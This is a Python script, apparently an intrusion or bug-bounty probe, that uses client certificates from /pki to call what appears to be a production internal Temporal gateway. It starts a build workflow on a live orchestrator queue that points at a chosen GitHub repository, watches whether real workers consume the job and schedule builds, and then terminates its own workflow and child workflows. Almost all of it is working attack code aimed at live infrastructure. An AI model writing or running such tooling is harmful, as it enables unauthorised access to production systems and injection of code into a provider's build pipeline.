#!/usr/bin/env python3
# I68052 act-3: metadata-correct StartWorkflowExecution (self project, self public repo) on live
# builds/orchestrator queue; observe real worker consumption + snapshot/build scheduling; terminate own exec + children.
import subprocess, struct, json, time, re, os, uuid

G = 'https://external-mtls-service-gateway-us-west1.gcp.production.rlwy.net'
CA = '/pki/server-ca-bundle.crt'; CRT = '/pki/client.crt'; KEY = '/pki/client.key'
T = '/temporal.api.workflowservice.v1.WorkflowService/'
TS = time.strftime('%Y%m%dT%H%M%SZ', time.gmtime())
CTR = [0]
NS = 'builds'; QUEUE = 'orchestrator'
OUR_P = '104cdfa2-f46b-45ed-b2b9-ec4db24b1b3f'
OUR_E = '6bd910b8-f1f5-43e5-b497-5bc2a4c55e3d'
OUR_S = '185f72a5-3373-41c1-982c-2af89c6e1191'
OUR_D = '6f3b362b-165d-4b7c-9f5e-4786513f4c7f'
COMMIT = '877c3594d9c3852536a4c2184df111bb850b1af4'
ET = {1: 'WfStarted', 2: 'WfCompleted', 3: 'WfFailed', 4: 'WfTimedOut', 5: 'WfTaskScheduled',
      6: 'WfTaskStarted', 7: 'WfTaskCompleted', 8: 'WfTaskTimedOut', 9: 'WfTaskFailed',
      10: 'ActScheduled', 11: 'ActStarted', 12: 'ActCompleted', 13: 'ActFailed', 14: 'ActTimedOut',
      15: 'TimerStarted', 16: 'TimerFired', 24: 'WfTerminated', 26: 'ChildInitiated', 27: 'ChildInitFailed',
      28: 'ChildStarted', 29: 'ChildCompleted', 30: 'ChildFailed', 32: 'ChildTimedOut'}


def varint(n):
    o = bytearray()
    while True:
        b = n & 0x7f; n >>= 7
        if n: o.append(b | 0x80)
        else: o.append(b); return bytes(o)


def fv(f, n): return varint(f << 3) + varint(n)
def fb(f, b): return varint((f << 3) | 2) + varint(len(b)) + b
def fs(f, s): return fb(f, s.encode() if isinstance(s, str) else s)
def fmsg(f, m): return fb(f, m)


def rd_varint(b, i):
    r = 0; s = 0
    while i < len(b):
        x = b[i]; r |= (x & 0x7f) << s; i += 1
        if not x & 0x80: return r, i
        s += 7
    raise ValueError('v')


def parse(b):
    i = 0; out = []
    while i < len(b):
        k, i = rd_varint(b, i); f = k >> 3; w = k & 7
        if f == 0: raise ValueError('f0')
        if w == 0:
            v, i = rd_varint(b, i); out.append((f, 0, v))
        elif w == 2:
            l, i = rd_varint(b, i)
            if i + l > len(b): raise ValueError('len')
            out.append((f, 2, b[i:i + l])); i += l
        elif w == 5: out.append((f, 5, b[i:i + 4])); i += 4
        elif w == 1: out.append((f, 1, b[i:i + 8])); i += 8
        else: raise ValueError('wt')
    return out


def call(path, body=b'', timeout=25):
    CTR[0] += 1
    fu = '/tmp/r%d' % CTR[0]; hu = '/tmp/rh%d' % CTR[0]; bu = '/tmp/rb%d' % CTR[0]
    open(fu, 'wb').write(b'\x00' + struct.pack('>I', len(body)) + body)
    subprocess.run(['curl', '-sS', '--http2', '--connect-timeout', '6', '-m', str(timeout), '-D', hu, '-o', bu,
                    '--cert', CRT, '--key', KEY, '--cacert', CA, '-X', 'POST', G + path,
                    '-H', 'te: trailers', '-H', 'content-type: application/grpc', '--data-binary', '@' + fu],
                   capture_output=True, text=True)
    hdr = open(hu, 'rb').read().decode('utf-8', 'replace') if os.path.exists(hu) else ''
    sts = re.findall(r'grpc-status:\s*(\d+)', hdr)
    msgs = re.findall(r'grpc-message:\s*([^\r\n]*)', hdr)
    data = open(bu, 'rb').read() if os.path.exists(bu) else b''
    for f in (fu, hu, bu):
        try: os.unlink(f)
        except Exception: pass
    return {'st': sts[-1] if sts else '-', 'msg': msgs[-1].strip()[:160] if msgs else '',
            'data': data, 'n': len(data)}


def payload(b):
    if len(b) >= 5 and b[0] == 0:
        return b[5:5 + struct.unpack('>I', b[1:5])[0]]
    return b


def g1(b, f):
    try:
        for ff, w, v in parse(b):
            if ff == f and w == 2: return v
    except Exception: return None


def txt(b, lim=400):
    return ' '.join(x.decode('utf-8', 'replace') for x in re.findall(rb'[\x20-\x7e]{4,}', b))[:lim]


def exm(wid, rid=''):
    return fs(1, wid) + (fs(2, rid) if rid else b'')


def dur(s): return fv(1, s)


def start_body(wid, wtype, tq, inp):
    data = json.dumps(inp).encode()
    pl = fmsg(1, fs(1, 'encoding') + fs(2, 'json/plain')) + fmsg(2, data)   # Payload{metadata,data}
    b = fs(1, NS) + fs(2, wid) + fmsg(3, fs(1, wtype)) + fmsg(4, fs(1, tq)) + fmsg(5, pl)
    b += fmsg(6, dur(120)) + fmsg(7, dur(120)) + fmsg(8, dur(10))
    b += fs(9, 'i68052-probe') + fs(10, str(uuid.uuid4())) + fv(11, 2)
    return b


def hist(wid, rid, pages=2):
    tok = b''; evs = []
    for pg in range(pages):
        r = call(T + 'GetWorkflowExecutionHistory', fs(1, NS) + fmsg(2, exm(wid, rid)) + fv(3, 50) + (fmsg(4, tok) if tok else b''), 30)
        if r['st'] != '0': return evs
        pl = payload(r['data']); h = g1(pl, 1) or b''
        evs.extend([v for f, w, v in parse(h) if f == 1 and w == 2])
        tok = g1(pl, 3) or b''
        if not tok: break
    return evs


def seq(evs):
    out = []
    for ev in evs:
        et = [v for f, w, v in parse(ev) if f == 3 and w == 0]
        out.append(et[0] if et else 0)
    return out


def terminate(wid, rid, why):
    r = call(T + 'TerminateWorkflowExecution', fs(1, NS) + fmsg(2, exm(wid, rid)) + fs(3, why) + fs(5, 'i68052') + fs(6, rid), 25)
    print('TERM|%s|st=%s|m=%s' % (wid[:50], r['st'], r['msg']), flush=True)


def list_all(n=40):
    r = call(T + 'ListWorkflowExecutions', fs(1, NS) + fv(2, n), 25)
    res = []
    if r['st'] != '0': return res
    for ei in [v for f, w, v in parse(payload(r['data'])) if f == 1 and w == 2]:
        ex = g1(ei, 1) or b''
        res.append({'wid': (g1(ex, 1) or b'').decode('utf-8', 'replace'),
                    'rid': (g1(ex, 2) or b'').decode('utf-8', 'replace'),
                    'type': (g1(g1(ei, 2) or b'', 1) or b'').decode('utf-8', 'replace')})
    return res


def parent_of(wid, rid):
    evs = hist(wid, rid, 1)
    for ev in evs:
        sa = g1(ev, 6)
        if sa:
            pe = g1(sa, 3)
            if pe: return (g1(pe, 1) or b'').decode('utf-8', 'replace')
    return ''


pre = set(x['wid'] for x in list_all())

inp = {
    'identifiers': {'projectID': OUR_P, 'environmentID': OUR_E, 'serviceID': OUR_S,
                    'deploymentID': OUR_D, 'snapshotID': str(uuid.uuid4())},
    'targetRegion': 'usw',
    'snapshotConfig': {'rootDirectory': '.', 'environmentPriority': ['production'],
                       'identifiers': {'projectID': OUR_P, 'environmentID': OUR_E, 'serviceID': OUR_S,
                                       'deploymentID': OUR_D, 'snapshotID': str(uuid.uuid4())}},
    'githubRepo': {'url': 'https://github.com/onepluspadtrading/buildctx-lab',
                   'bearerToken': '', 'refOrCommitSha': COMMIT},
    'envVars': {'RAILWAY_PROJECT_ID': OUR_P, 'RAILWAY_ENVIRONMENT_ID': OUR_E, 'RAILWAY_SERVICE_ID': OUR_S},
    'railpack': {'previousVersions': {}, 'githubBotToken': ''},
    'limits': {'maxBuildStepTime': '', 'maxWorkflowLifetime': '', 'maxCompressedImageSize': ''},
    'previousCodeURI': '',
    'builderMode': 'BUILDER_MODE_V3',
}
wid = 'i68052-q2real-' + TS
print('===I68052-ACT3 START=== %s' % TS, flush=True)
r = call(T + 'GetSystemInfo')
print('CTL|st=%s|%s' % (r['st'], txt(payload(r['data']), 40)), flush=True)
r = call(T + 'StartWorkflowExecution', start_body(wid, 'ScheduleSnapshotAndBuild', QUEUE, inp), 30)
print('START|st=%s|m=%s|len=%d' % (r['st'], r['msg'], r['n']), flush=True)
rid = ''
if r['st'] == '0':
    for f, w, v in parse(payload(r['data'])):
        if f == 1 and w == 2:
            rid = v.decode(); break
print('RUNID|%s' % rid, flush=True)
if rid:
    t0 = time.time(); seen = []
    while time.time() - t0 < 45:
        evs = hist(wid, rid, 3)
        s = seq(evs)
        names = [ET.get(x, str(x)) for x in s]
        if s != seen:
            seen = s
            print('EV|t=%.1f|%s' % (time.time() - t0, ','.join(names)), flush=True)
            if 10 in s or 26 in s or 28 in s:
                print('BUILD_SCHEDULING_OBSERVED', flush=True)
                break
            if 2 in s or 3 in s or 24 in s:
                break
        time.sleep(1.2)
    evs = hist(wid, rid, 3)
    for ev in evs:
        et = [v for f, w, v in parse(ev) if f == 3 and w == 0]
        et = et[0] if et else 0
        if et == 3:
            fa = g1(ev, 8)
            if fa: print('WFFAILED|%s' % txt(g1(fa, 1) or b'', 700), flush=True)
        if et == 10:
            sa = g1(ev, 15)
            if sa:
                aid = txt(g1(sa, 1) or b'', 60)
                aty = txt(g1(g1(sa, 2) or b'', 1) or b'', 60)
                atq = txt(g1(g1(sa, 3) or b'', 1) or b'', 60)
                ain = txt(g1(sa, 5) or b'', 300)
                print('ACTIVITY|id=%s|type=%s|tq=%s|input=%s' % (aid, aty, atq, ain), flush=True)
        if et in (13, 14):
            fa = g1(ev, 18 if et == 13 else 19)
            if fa: print('ACTFAIL|%s' % txt(g1(fa, 1) or b'', 700), flush=True)
    terminate(wid, rid, 'i68052 q2real cleanup')
    time.sleep(1.0)
    # children (parent == our wid) -> terminate; anything else just report
    for e in list_all():
        if e['wid'] in pre or e['wid'] == wid:
            continue
        try:
            par = parent_of(e['wid'], e['rid'])
        except Exception:
            par = ''
        if par == wid:
            print('CHILD|%s|type=%s|parent=OURS' % (e['wid'][:50], e['type']), flush=True)
            terminate(e['wid'], e['rid'], 'i68052 child cleanup')
        elif e['type'] in ('SnapshotAndBuild', 'ScheduleSnapshotAndBuild', 'BuildAndPublishImage'):
            pass
print('===I68052-ACT3 END===', flush=True)
